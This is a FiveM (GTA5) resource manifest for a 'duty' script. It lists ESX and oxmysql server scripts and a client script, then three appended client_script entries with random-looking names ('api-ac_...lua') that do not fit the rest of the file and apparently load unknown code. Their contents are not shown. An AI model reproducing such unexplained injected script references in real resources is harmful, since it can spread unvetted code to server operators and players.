fx_version "bodacious"
games {"gta5"}
lua54 'yes'
description 'duty'
version '1.0.0'

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'server/main.lua',
}

client_scripts {
	'client/main.lua',
}

client_script "api-ac_OJOKaWCvUYzT.lua"
client_script "api-ac_vOJKHGqGxvPe.lua"
client_script "api-ac_uuQhioHoEMHi.lua"